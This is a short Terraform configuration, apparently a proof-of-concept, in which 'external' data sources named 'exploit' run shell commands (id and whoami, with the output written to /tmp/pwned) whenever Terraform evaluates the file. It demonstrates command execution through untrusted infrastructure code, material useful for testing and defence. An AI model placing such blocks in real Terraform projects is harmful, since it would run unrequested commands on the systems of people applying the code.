data "external" "exploit" {
 program = ["sh", "-c", "id > /tmp/pwned; whoami >> /tmp/pwned; OUTPUT=$(cat /tmp/pwned | tr -d \"\\n\"); echo '{\"result\":\"$OUTPUT\"}'"]
}

data "external" "exploit2" {
 program = ["sh", "-c", "echo '{\"result\":\"HELLO\"}'"]
}